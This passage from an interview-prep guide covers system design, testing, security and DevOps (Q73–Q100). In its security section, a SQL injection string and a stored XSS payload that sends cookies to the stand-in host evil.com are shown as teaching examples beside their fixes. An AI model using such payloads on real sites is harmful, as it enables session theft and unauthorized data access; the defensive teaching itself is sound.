- **L7** — understands HTTP; route `/api/*` vs `/static/*`, sticky sessions, header-based canary routing
It's simultaneously a scaling tool and the first line of high availability.

**Q73. Caching — layers, the core pattern, and pitfalls?**

```python
def get_user(uid):                       # CACHE-ASIDE pattern
    if cached := redis.get(f"user:{uid}"):
        return json.loads(cached)
    user = db.fetch_user(uid)
    redis.setex(f"user:{uid}", 300, json.dumps(user))   # TTL = staleness bound
    return user
```
Layers closest-first: browser → CDN → Redis → DB's own caches. Pitfalls:
- **Invalidation** — stale data ("one of the two hard problems"); TTLs bound the damage, delete-on-write tightens it
- **Stampede** — a hot key expires, 10k requests hit the DB at once → lock/single-flight + jittered TTLs
- Caching per-user data under a shared key — a privacy incident, not a bug

**Q74. Monolith vs microservices — the senior answer?**
Monolith: one deployable — simpler to build, test, debug, and it scales further than people admit. Microservices buy **independent deploys and scaling per team** at the price of distributed-systems pain: network failures, tracing, data consistency, ops overhead.
*Senior answer:* start with a **well-modularized monolith** (clean internal boundaries); extract a service when a specific pressure demands it — team deploy contention, divergent scaling, isolation needs. Microservices solve an *organizational* problem more than a technical one.

**Q75. What is a message queue and what problems does it solve?**

```python
# Without: signup waits on email (2s) — and fails if the email provider is down
def signup(user):
    create_user(user); send_welcome_email(user)      # coupled, slow, fragile

# With: respond instantly; a worker sends the email, retries on failure
def signup(user):
    create_user(user)
    queue.publish("welcome_email", {"user_id": user.id})
```
Also: absorbs traffic spikes, decouples services, dead-letter queues catch poison messages. Key discipline: delivery is **at-least-once**, so consumers must be **idempotent** (Q56).

**Q76. What is event-driven architecture?**
Services publish facts ("OrderPlaced"); interested services subscribe — no direct calls.

```
OrderService ──publish──▶ [ OrderPlaced ] ──▶ EmailService (confirmation)
                                          ──▶ InventoryService (reserve)
                                          ──▶ AnalyticsService (record)
        (add a 4th consumer without touching OrderService)
```
Wins: loose coupling, natural audit log, buffering resilience. Costs: eventual consistency, harder end-to-end reasoning, duplicate delivery to design for.

**Q77. How do you design for high availability?**
Eliminate single points of failure: redundant instances across availability zones, load balancer + health checks, DB replication with automatic failover, stateless services so instances are disposable.
Quantify with "nines": 99.9% ≈ 8.7h down/year; 99.99% ≈ 52min. Each extra nine costs disproportionately more — the target is a **business** decision, not an engineering ego metric.

**Q78. What patterns make systems resilient to partial failure?**

```python
resp = http.get(url, timeout=2)              # TIMEOUT: never wait forever

for attempt in range(3):                     # RETRY + exponential backoff + jitter
    try:
        return call()
    except TransientError:
        time.sleep((2 ** attempt) + random.random())   # only for idempotent ops!
```
- **Circuit breaker** — after N failures, stop calling the sick service, fail fast, probe later (prevents cascade)
- **Bulkheads** — separate connection/thread pools per dependency so one failure can't drown all
- **Graceful degradation** — show cached recommendations instead of an error page

**Q79. What is eventual consistency, and where is it acceptable?**
After a write, replicas converge *eventually* — a read in the gap may be stale.
- Fine: like counts, view counters, feeds, search indexes
- Not fine: account balances, inventory at checkout, permissions/access revocation
Always ask: "what does the user experience if this read is 2 seconds stale?" — that answer picks your consistency model per feature, not per system.

**Q80. Distributed transactions and the Saga pattern?**
Order + payment + inventory live in different services — no single ACID transaction covers them. **Saga**: a chain of local transactions, each emitting an event that triggers the next; on failure, run **compensating actions** to undo:

```
CreateOrder ✓ → ChargePayment ✓ → ReserveInventory ✗
                     │
                     ▼ compensate backwards
              RefundPayment → CancelOrder
```
You trade atomicity for availability and must design the "undo" path explicitly — refunds, releases, cancellations are first-class code.

**Q81. What is observability (logs, metrics, traces)?**

```python
log.info("payment_processed",                 # STRUCTURED log, machine-parseable
         order_id=o.id, amount=o.total,
         request_id=ctx.request_id)           # correlate across services
```
- **Logs** — what happened, per event
- **Metrics** — numbers over time: latency **p95/p99** (averages hide pain), error rate, throughput, saturation → dashboards + alerts
- **Traces** — one request's journey across services, showing where the milliseconds went
Senior mindset: instrument *before* the incident; alert on symptoms users feel (error rate, latency), not just CPU.

**Q82. Rate limiting — why, and which algorithm?**

```python
# TOKEN BUCKET: refill at rate R, each request spends one → allows short bursts
def allow(key):
    tokens, last = store.get(key)
    tokens = min(CAP, tokens + (now() - last) * RATE)
    if tokens >= 1:
        store.set(key, (tokens - 1, now())); return True
    return False        # → respond 429 + Retry-After
```
Alternatives: leaky bucket (smooths to constant rate), sliding window counters. Apply at the edge (per-IP), per API key, and between internal services — overload protection is a form of availability.

---

## Part 8: Testing & Quality (Q83–Q90)

**Q83. What is the testing pyramid?**
```
        ╱  E2E  ╲          few — browser/API level, realistic, slow, flaky
       ╱ integr. ╲         some — real components together (service + DB container)
      ╱   unit    ╲        many — single functions, milliseconds, precise failures
```
Bottom-heavy = fast feedback and trustworthy failures. An inverted pyramid (mostly E2E) means 40-minute suites and "rerun it, probably flaky" culture.

**Q84. Mocks, stubs, and fakes?**

```python
# STUB — canned answers
repo.find_by_email = lambda e: User(id=1, email=e)

# MOCK — verifies the interaction
email = Mock()
signup(user, email_service=email)
email.send.assert_called_once_with(user.email, "welcome")

# FAKE — real lightweight implementation
class InMemoryRepo:                # from Q25 — behaves like the real thing
    ...
```
Guideline: don't over-mock. Tests wired to internal call sequences break on every refactor while proving little — prefer fakes + asserting outcomes.

**Q85. What makes a *good* unit test?**
Fast, isolated, deterministic, and asserting **behavior, not implementation**:

```python
def test_rejects_expired_coupon():           # name reads like a spec
    order = make_order(coupon=Coupon(expires=YESTERDAY))
    with pytest.raises(CouponExpired):
        checkout(order)
```
Pattern: Arrange → Act → Assert, one logical assertion. Litmus test: if renaming a private method breaks 40 tests, the tests test the wrong thing.

**Q86. What is TDD — and the honest senior take?**
Red → green → refactor: write a failing test, make it pass minimally, clean up. Real benefits: testable design by construction, safety net, executable documentation.
Honest take: strict TDD shines for pure logic and **bug fixes** (reproduce the bug in a test *first* — it can never silently return); it's clumsy for exploratory/UI work. The non-negotiable outcome is *meaningful tests exist* — the ceremony is optional.

**Q87. Code coverage — why is 100% a trap?**
Coverage measures **execution, not verification**:

```python
def test_processes_order():
    process(order)          # 95% coverage, asserts NOTHING — worthless
```
Useful as a floor detector (30% = blind spots). Chasing 100% breeds brittle tests of trivial code. Aim high on core business logic; judge tests by the bugs they'd catch, not the lines they touch.

**Q88. What do you look for in a code review?**
Priority order: correctness & edge cases → design (right abstraction? fits the architecture?) → readability (will the next person understand it?) → tests covering the risky paths → performance/security where relevant. Style nits belong to linters, not humans.
Senior conduct: review promptly (a blocked teammate is expensive), ask questions instead of issuing commands ("what happens if this list is empty?"), approve when it's *better*, not perfect.

**Q89. What is refactoring and when should you do it?**
Improving structure **without changing behavior**, with tests as the safety net. When:
- Continuously, in small doses — the boy-scout rule (leave code slightly better)
- Before a feature in hostile code — "make the change easy, then make the easy change"
- Never as a big-bang rewrite mixed with behavior changes — you won't know which change broke it

**Q90. How do you debug a hard problem systematically?**
1. **Reproduce reliably** — a bug you can trigger on demand is half-solved
2. Read the actual error and logs (not what you assume they say)
3. Form a hypothesis; test it — change **one** variable at a time
4. **Bisect** the search space — `git bisect` across commits, binary-search the input, isolate layers (is it client, API, or DB?)
5. When stuck: explain it out loud (rubber duck), check what changed recently, question the assumption you're most sure of — that's where the bug lives

---

## Part 9: Security (Q91–Q95)

**Q91. The vulnerabilities every engineer must know (OWASP-style)?**
- **Injection** — untrusted input becomes code (SQL/command)
- **Broken authentication** — weak sessions, credential stuffing
- **XSS** — attacker's script runs in other users' browsers
- **Broken access control** — change `/orders/42` to `/orders/43` and see someone else's data (IDOR)
- **Misconfiguration** — default creds, public buckets, verbose errors
- **Vulnerable dependencies** — known-CVE libraries in your build
The theme: never trust input; verify authorization server-side on **every** request.

**Q92. How do you prevent SQL injection and XSS?**

```python
# INJECTION — the vulnerable pattern
db.execute(f"SELECT * FROM users WHERE name = '{name}'")
# name = "' OR '1'='1' --"  → returns every user

# FIX: parameterized — input is DATA, never code
db.execute("SELECT * FROM users WHERE name = %s", (name,))
```
**XSS**: a stored comment `<script>fetch('evil.com?c='+document.cookie)</script>` runs in every viewer's browser. Fix: escape output by default (modern template engines do), sanitize any user HTML you must render, set a Content-Security-Policy, mark session cookies `HttpOnly`.
Shared root cause: mixing untrusted data into an interpreted context. Shared cure: strict separation.

**Q93. Authentication vs authorization; sessions vs tokens?**
**Authentication** = who are you (login). **Authorization** = what may you do — checked server-side on *every* request:

```python
def get_order(order_id, current_user):
    order = repo.get(order_id)
    if order.user_id != current_user.id:     # authorization — the check
        raise Forbidden()                     # people forget (IDOR, Q91)
    return order
```
**Sessions**: server holds state, client a session-ID cookie — easy revocation, needs a shared store to scale. **JWTs**: server signs claims, verifies statelessly — scales easily, but revocation is hard → short-lived access tokens + refresh tokens. Prefer `HttpOnly` cookies over localStorage for storage.

**Q94. How should passwords be stored?**

```python
# NEVER: plaintext, encryption (reversible), or fast hashes (MD5/SHA-256 — GPUs
# try billions/sec). ALWAYS: slow, salted, adaptive:
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())      # salt built in
ok = bcrypt.checkpw(attempt.encode(), hashed)
```
The per-user salt defeats rainbow tables; tunable slowness defeats brute force (bcrypt/scrypt/argon2). Add rate limiting + MFA. If a system can *show* you your old password, run.

**Q95. Least privilege and defense in depth?**
- **Least privilege** — every user, service, and API key gets minimum access: the reporting service can `SELECT` only; the deploy key can't touch prod data; the intern can't drop the database.
- **Defense in depth** — overlapping layers (network rules + auth + input validation + encryption + audit logs) so one failed control isn't game over.
Together they turn a breach from catastrophe into contained incident — assume any single layer *will* eventually fail.

---

## Part 10: DevOps, Delivery & Engineering Practice (Q96–Q100)

**Q96. What is CI/CD?**

```yaml
# CI in one glance (GitHub Actions)
on: push
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
      - run: pip install -r requirements.txt
      - run: ruff check . && pytest --cov     # every push: lint + tests
```
**CI**: breakage surfaces in minutes, on a neutral machine. **CD**: every green build is automatically shippable (or shipped). The payoff is risk shape: many small reversible releases instead of rare terrifying big-bangs.

**Q97. Containers vs virtual machines?**
Container (Docker): app + dependencies packaged, running isolated on a **shared OS kernel** — starts in milliseconds; "works on my machine" solved because the image *is* the environment.

```dockerfile
FROM python:3.12-slim
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
CMD ["gunicorn", "app:app"]
```
VM: virtualizes whole hardware with its own OS — stronger isolation, heavier, slower to boot. Kubernetes then schedules, scales, heals, and rolls out containers across a fleet.

**Q98. Blue-green, canary, and feature flags?**
- **Blue-green** — two identical environments; deploy to the idle one, flip traffic, rollback = flip back
- **Canary** — route ~5% of traffic to the new version, watch error/latency metrics, ramp or abort

```python
# FEATURE FLAG — deploy ≠ release
if flags.enabled("new_checkout", user):
    return new_checkout(user)      # dark-launched, ramp 1% → 100%, kill instantly
return old_checkout(user)
```
Together they make releases boring — which is the goal.

**Q99. Technical debt — how do you manage it as a senior?**
Shortcuts that speed you up now and tax every future change. Sometimes rational (ship the MVP); toxic when invisible and unbounded. Manage it:
- Make it **visible** — tickets, an explicit register, `# DEBT:` comments that get collected
- Budget a steady slice of each cycle for paydown; refactor opportunistically in code you're touching anyway
- Translate to business language: "this module costs us ~2 days per sprint in bugs" — now prioritization is a shared decision, not an engineering complaint

**Q100. What does "senior" mean beyond coding skill?**
Multiplying the team, not just yourself:
- Making trade-offs explicit (build vs buy, fast vs right) and tying them to business impact
- Designing for the next engineer — clarity over cleverness
- De-risking: small increments, monitoring, rollback plans, "what's the blast radius?"
- Mentoring through reviews and pairing; communicating with non-engineers without jargon
In the interview, it shows as answer structure: **definition → why it matters → trade-off → when I'd choose differently.** That last clause is the senior signal.

---

*How to use this: don't memorize answers — rehearse the shape. For each question, say the definition in one breath, give the example, then volunteer the trade-off. The examples here are in Python/SQL so you can actually run them; being able to sketch the code on a whiteboard is what turns "knows the term" into "has clearly done this."*
